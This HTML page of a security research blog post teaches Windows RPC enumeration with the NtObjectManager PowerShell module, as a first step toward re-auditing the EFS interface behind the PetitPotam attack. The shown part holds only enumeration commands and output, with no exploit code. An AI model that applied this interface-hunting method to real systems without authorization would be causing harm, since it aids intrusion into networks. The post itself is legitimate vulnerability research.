<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="From NtObjectManager to PetitPotam" /><meta name="author" content="clearbluejar" /><meta property="og:locale" content="en" /><meta name="description" content="Windows RPC enumeration, discovery, and auditing via NtObjectManager. We will audit the vulnerable RPC interfaces that lead to PetitPotam, discover how they have changed over the past year, and overcome some common RPC auditing pitfalls." /><meta property="og:description" content="Windows RPC enumeration, discovery, and auditing via NtObjectManager. We will audit the vulnerable RPC interfaces that lead to PetitPotam, discover how they have changed over the past year, and overcome some common RPC auditing pitfalls." /><link rel="canonical" href="https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/" /><meta property="og:url" content="https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/" /><meta property="og:site_name" content="clearbluejar" /><meta property="og:image" content="https://clearbluejar.github.io/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/leif-linding-6Ym4iEGFqzQ-unsplash.jpg" /><meta property="og:image:alt" content="From NtObjectManager to PetitPotam" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-24T03:46:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://clearbluejar.github.io/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/leif-linding-6Ym4iEGFqzQ-unsplash.jpg" /><meta name="twitter:image:alt" content="From NtObjectManager to PetitPotam" /><meta property="twitter:title" content="From NtObjectManager to PetitPotam" /><meta name="twitter:site" content="@clearbluejar" /><meta name="twitter:creator" content="@clearbluejar" /><meta name="google-site-verification" content="yeZcjox5p1UhtqcHFYkiXFGf013zyULTn74IVNLoVbE" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"clearbluejar"},"dateModified":"2022-09-04T12:57:56+00:00","datePublished":"2022-06-24T03:46:00+00:00","description":"Windows RPC enumeration, discovery, and auditing via NtObjectManager. We will audit the vulnerable RPC interfaces that lead to PetitPotam, discover how they have changed over the past year, and overcome some common RPC auditing pitfalls.","headline":"From NtObjectManager to PetitPotam","image":{"src":"/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/leif-linding-6Ym4iEGFqzQ-unsplash.jpg","alt":"From NtObjectManager to PetitPotam","url":"https://clearbluejar.github.io/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/leif-linding-6Ym4iEGFqzQ-unsplash.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/"},"url":"https://clearbluejar.github.io/posts/from-ntobjectmanager-to-petitpotam/"}</script><title>From NtObjectManager to PetitPotam | clearbluejar</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="clearbluejar"><meta name="application-name" content="clearbluejar"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://github.com/clearbluejar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">clearbluejar</a></div><div class="site-subtitle font-italic">blog, code, and research</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/clearbluejar" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/clearbluejar" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>From NtObjectManager to PetitPotam</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>From NtObjectManager to PetitPotam</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1656042360" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 24, 2022 </em> </span> <span> Updated <em class="" data-ts="1662296276" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 4, 2022 </em> </span><div class="mt-3 mb-3"> <img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/leif-linding-6Ym4iEGFqzQ-unsplash.jpg" class="preview-img bg" alt="From NtObjectManager to PetitPotam" data-proofer-ignore><figcaption class="pt-2 pb-2">From NtObjectManager to PetitPotam</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> clearbluejar </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6325 words"> <em>35 min</em> read</span></div></div></div><div class="post-content"><p><strong>TL;DR - Windows RPC enumeration, discovery, and auditing via NtObjectManager. We will audit the vulnerable RPC interfaces that lead to PetitPotam, discover how they have changed over the past year, and overcome some common RPC auditing pitfalls.</strong></p><p>I was inspired by <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">From RpcView to PetitPotam</a> from <a href="https://twitter.com/itm4n">@itm4n</a>, an excellent post that taught me how to use <a href="https://github.com/silverf0x/RpcView">RpcView</a> to discover the RPC interfaces and in particular the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31">one</a> that enabled <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> by <a href="https://twitter.com/topotam77">@topotam77</a>. In the post, <em>itm4n</em> progresses from RPC interface discovery to teaching us how to build a RPC client to flex the vulnerable interface. This post is a spinoff of that same topic, this time leveraging James Forshaw’s (<a href="https://twitter.com/tiraniddo">@tiraniddo</a>) <a href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.32">NtObjectManager</a>. It was also a perfect opportunity to learn how to use <em>NtObjectManager</em> for RPC research and auditing using a well known example.</p><p><em>Itm4n</em> walks through complex topics for Windows RPC with seeming ease. Covering the high level aspects and offering clarity for nuanced RPC concepts such as binding handles with <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/#:~:text=Unlike%20with%20kernel%20object%20handles%20though%2C%20there%20are%20multiple%20types%20of%20binding%20handles%3A%20automatic%2C%20implicit%20and%20explicit.">clear pictures</a>. A topic in which MSDN quickly <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/types-of-binding-handles">lost me</a>. More to the point of this post, he explains how to leverage RpcView to:</p><ul><li>discover interesting <em>interfaces</em>, <em>procedures</em>, and <em>endpoints</em><li>decomplile a RPC EFS interface related to PetitPotam<li>help build a RPC client in Visual Studio to exercise the EFS interface</ul><p>At the end of the post, <em>Itm4n</em> alludes to other ways of doing what he did and even references the toolset I’m about to walk through.</p><blockquote><p>Finally, implementing an RPC client in C/C++ isn’t necessarily the best approach if you are doing some security oriented research as this process is rather time-consuming. However, I would still recommend it because it is a good way to learn and have a better understanding of some Windows internals. <strong>As an alternative, a more research oriented approach would consist in using the NtObjectManager</strong> module developed by James Forshaw. This module is quite powerful as it allows you to interact with an RPC server in a few lines of PowerShell. As usual, James wrote an excellent article about it here: Calling Local Windows RPC Servers from .NET. <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">From RpcView to PetitPotam</a></p></blockquote><p>Now we are going to try and walk through the alternative approach using <em>NtObjectManager</em>. Perhaps, by the end we can discover together some pros and cons of each toolset.</p><h2 id="ntobjectmanager-and-rpc"><span class="mr-2">NtObjectManager and RPC</span><a href="#ntobjectmanager-and-rpc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtObjectManager">NtObjectManager</a> PowerShell module (backed by its supporting .NET managed library <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/main/NtApiDotNet">NtApiDotNet</a>) is a godsend for Windows security researchers. From dealing with <a href="https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html">symbolic links</a>, <a href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">auditing</a> RPC servers, playing tricks with the <a href="https://www.trustedsec.com/blog/object-overloading/">Object Manager</a>, to just messing about with Windows, it has a myriad of applications. As one trying to improve their own auditing skills and understanding Windows internals, I am grateful for it. Right now I’ll admit that I am just touching the surface of the capability of the toolset. There are some <a href="https://www.tiraniddo.dev/2020/07/generating-ndr-type-serializers-for-c.html">advanced use cases</a> that I have yet to get my head around. This post will be a step in the right direction. Before we jump into how to use <em>NtObjectManager</em> for RPC auditing, let’s take a short walk through the history of the RPC capabilities within <em>NtApiDotNet</em>.</p><p>Forshaw put together <em>NtObjectManager</em> and his <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools">sandbox attack surface analysis tool kit</a> for expediting his own research and the benefit of others. He is known to develop tools where he can’t find any other solutions in support of his security research.</p><blockquote><p>As much as I enjoy finding security vulnerabilities in Windows, in many ways I prefer the challenge of writing the tools to make it easier for me and others to do the hunting. <a href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">Calling Local Windows RPC Servers from .NET</a></p></blockquote><p>The RPC capabilities within <em>NtApiDotNet</em> have been there for sometime with their formal introduction being the <a href="https://www.youtube.com/watch?v=2GJf8Hrxm4k">“Reimplementing Local RPC in .NET”</a> talk. Here I am in 2022, finally getting around to playing with the toolset.</p><h3 id="rpc-history"><span class="mr-2">RPC History</span><a href="#rpc-history" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Essentially this is a list of RPC references for NtObjectManager.</p><p><code class="language-plaintext highlighter-rouge">cat README.txt | grep -i -e "rpc" -e "ndr"</code></p><ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.12">v1.1.12</a><ul><li>Added basic NDR parser.</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.16">v1.1.16</a><ul><li>Added support for extracting RPC servers from a DLL.<li>Added support for enumerating registered RPC endpoints with Get-RpcEndpoint.<li>Added support for enumerating running service information with Get-RunningService.</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.17">v1.1.17</a><ul><li>Added option to parse out RPC clients in Get-RpcServer<li>Added Get-RpcAlpcServer cmdlet</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.21">v1.1.21</a><ul><li>Added basic RPC ALPC client support</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.23">v1.1.23</a><ul><li>Added Compare-RpcServer.<li>Added option to Format-RpcClient to output to a directory.<li>Added Select-RpcServer cmdlet.<li>Added RPC ALPC port brute force.</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.28">v1.1.28</a><ul><li>Added C# compiler support for .NET Core Support of Get-RpcClient.</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.30">v1.1.30</a><ul><li>Added basic named pipe support for RPC clients.</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.31">v1.1.31</a><ul><li>Added TCP/IP RPC transport and add signing/encryption.<li>Added Disconnect-RpcClient.<li>Added server information for local RPC connection</ul><li><a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.33">v1.1.33</a><ul><li>Added RPC pipe support.</ul></ul><p>Doing a bit more digging, it seems RPC functionality appeared within <code class="language-plaintext highlighter-rouge">NtApiDotNet</code> in 2018. The first evidence I can see of an <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/v1.1.12/NtApiDotNet/Ndr/NdrRpcServerInterface.cs">NDR parser</a> in NtApiDotNet from release tag <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.12">v1.1.12</a>. By July 2018, the ability to parse RPC servers <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/commit/6801e082a8eea5fb54a621e8a383ae5b6fe469a5">was there</a> and in November of 2018, NtObjectManager Forshaw put out a post demonstrating the ability to <a href="https://www.tiraniddo.dev/2018/11/finding-windows-rpc-client.html">parse RPC servers and clients</a>. At this point, NtApiDotNet was yet to have a RPC client generator, which seemed to arrive mid 2019 in <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.21">NtObjectManger v1.1.21</a> . The RPC C# client generator, as we will use later instead of a Visual Studio C++ and MIDL compiler, can greatly reduce the time needed to create an RPC client. In 2019, Forshaw posted <a href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">a tutorial</a> that walks us through the primary use cases for NtObjectManger in survey of the RPC landscape. That article will also be our starting point using NtObjectManager to rediscover PetitPotam a bit <a href="#ntobjectmanager-for-rpc-auditing">later</a>.</p><h3 id="implementation"><span class="mr-2">Implementation</span><a href="#implementation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>The implementation I developed is all available in the <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools">Sandbox Analysis Tools Github repository</a>. The implementation contains <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet/Ndr">classes</a> to load DLLs/EXEs and extract RPC server information to a .NET object. It also contains <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet/Ndr/Marshal">classes</a> to marshal data using the Network Data Representation (NDR) protocol as well as the <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/NtApiDotNet/Win32/Rpc/Transport">Local RPC client code</a>. Finally I implemented a <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/Win32/Rpc/RpcClientBuilder.cs">client generator</a> which takes in the parsed RPC server information and generates a C# source code file. <a href="https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html">Calling Local Windows RPC Servers from .NET</a></p></blockquote><p>The primary capabilities of the toolset are ideal for diving into RPC. The high level features I have seen are:</p><ul><li>RPC Server (and client) <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/067c7581fdbaca482525063ad73ef0d134598cff/NtObjectManager/RpcFunctions.ps1#L253">enumeration and discovery</a><li>RPC Client <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/067c7581fdbaca482525063ad73ef0d134598cff/NtObjectManager/RpcFunctions.ps1#L526">generation</a><li>RPC Server <a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/c02ed8ba04324e54a0a188ab9877ee6aa372dfac/NtObjectManager/Cmdlets/Rpc/CompareRpcServerCmdlet.cs#L36">Diffing</a></ul><h2 id="ntobjectmanager-for-rpc-auditing"><span class="mr-2">NtObjectManager for RPC Auditing</span><a href="#ntobjectmanager-for-rpc-auditing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Last time in <a href="https://clearbluejar.github.io/posts/surveying-windows-rpc-discovery-tools/">A Survey of Windows RPC Discovery Tools</a>, we obtained a detailed understanding of how some of these RPC enumeration tools work under the hood. This post will be more practical. In this section we recreate the RPC auditing from <a href="https://itm4n.github.io/from-rpcview-to-petitpotam/">RPCView to Petitpotam</a> by leveraging Forshaw’s <em>NtObjectManager</em>.</p><p>Before we get going, make sure you setup your <em>DbgHelp</em> DLL path before we get started.</p><pre><code class="language-PowerShell">PS C:\Users\user&gt; Set-GlobalSymbolResolver -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll' 
</code></pre><h3 id="use-ntobjectmanager-to-discover-interesting-interfaces-endpoints-procedures"><span class="mr-2">Use NtObjectManager to Discover interesting Interfaces, Endpoints, Procedures</span><a href="#use-ntobjectmanager-to-discover-interesting-interfaces-endpoints-procedures" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>As mentioned above and detailed by <em>itm4n</em>, RpcView provides a nice GUI and a workflow which you can pivot from a running <em>process</em> to the RPC <em>interfaces</em> and <em>endpoints</em> found within that process. I detailed in <a href="https://clearbluejar.github.io/posts/surveying-windows-rpc-discovery-tools/#when-to-use-which-tool">which contexts I might use each tool</a>, but after writing this post I feel like NtObjectManager is the front runner for general RPC auditing.</p><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/rpcview-gui.png" alt="rpcview-gui.png" class="shadow" data-proofer-ignore><em>RpcView GUI</em></p><p>By the time you see the GUI, and again on a set interval, RpcView automatically discovers the running processes that contain RPC servers. As we have learned, <em>NtObjectManager</em> in contrast, does not have a GUI and also does not analyze processes at runtime. Rather, the first step to RPC server discovery is to feed a list of files to be parsed by <code class="language-plaintext highlighter-rouge">Get-RpcServer</code> in <em>NtObjectManager</em>. Each file path piped into <code class="language-plaintext highlighter-rouge">Get-RpcServer</code> will be loaded in memory, parsed and have each image section checked for the <a href="https://clearbluejar.github.io/posts/surveying-windows-rpc-discovery-tools/#code-1">aforementioned</a> RPC data structures.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Find all servers in SYSTEM32. </span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="s2">"C:\Windows\system32\*"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="s2">"*.dll"</span><span class="p">,</span><span class="s2">"*.exe"</span><span class="w"> </span><span class="se">`
</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">Get-RpcServer</span><span class="w">

</span></pre></table></code></div></div><p>It will take about a minute or so to chug through all the binaries in <em>System32</em>…</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Measure-Command</span><span class="w"> </span><span class="p">{</span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="s2">"C:\Windows\system32\*"</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="s2">"*.dll"</span><span class="p">,</span><span class="s2">"*.exe"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-RpcServer</span><span class="w"> </span><span class="p">}</span><span class="w">

</span><span class="n">Days</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">Hours</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">Minutes</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">Seconds</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">59</span><span class="w">
</span><span class="n">Milliseconds</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">262</span><span class="w">
</span><span class="n">Ticks</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">592628678</span><span class="w">
</span><span class="n">TotalDays</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0.000685912821759259</span><span class="w">
</span><span class="n">TotalHours</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">0.0164619077222222</span><span class="w">
</span><span class="n">TotalMinutes</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">0.987714463333333</span><span class="w">
</span><span class="n">TotalSeconds</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">59.2628678</span><span class="w">
</span><span class="n">TotalMilliseconds</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">59262.8678</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/assets/img/2022-06-23-from-ntobjectmanager-to-petitpotam/ntobjectmanager-parsing-dlls.png" alt="NtObjectManager in action" class="shadow" data-proofer-ignore><em>NtObjectManager in action</em></p><p><em>NtObjectManager</em> found 456 RPC Servers (or interfaces) on my Windows 11 machine:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Measure-Object</span><span class="w"> </span><span class="nt">-Line</span><span class="w">

</span><span class="n">Lines</span><span class="w"> </span><span class="nx">Words</span><span class="w"> </span><span class="nx">Characters</span><span class="w"> </span><span class="nx">Property</span><span class="w">
</span><span class="o">-----</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">----------</span><span class="w"> </span><span class="o">--------</span><span class="w">
  </span><span class="mi">456</span><span class="w">
</span></pre></table></code></div></div><p>The result of parsing all the interfaces from the RPC servers from the binaries (and there often multiple interfaces within one binary) will look something like this:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\user</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$allrpc</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">more</span><span class="w">

</span><span class="n">Name</span><span class="w">                                                         </span><span class="nx">UUID</span><span class="w">                                 </span><span class="nx">Ver</span><span class="w"> </span><span class="nx">Procs</span><span class="w"> </span><span class="nx">EPs</span><span class="w"> </span><span class="nx">Service</span><span class="w">                   </span><span class="nx">Running</span><span class="w">
</span><span class="o">----</span><span class="w">                                                         </span><span class="o">----</span><span class="w">                                 </span><span class="o">---</span><span class="w"> </span><span class="o">-----</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="o">-------</span><span class="w">                   </span><span class="o">-------</span><span class="w">
</span><span class="n">ACPBackgroundManagerPolicy.dll</span><span class="w">                               </span><span class="nx">fc48cd89-98d6-4628-9839-86f7a3e4161a</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">9</span><span class="w">     </span><span class="nx">10</span><span class="w">                            </span><span class="nx">False</span><span class="w">
</span><span class="n">adhsvc.dll</span><span class="w">                                                   </span><span class="nx">c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1</span><span class="w"> </span><span class="nx">1.0</span><span class="w"> </span><span class="nx">7</span><span class="w">     </span><span class="nx">4</span><span class="w">                             </span><span class="nx">False</span><span class="w">
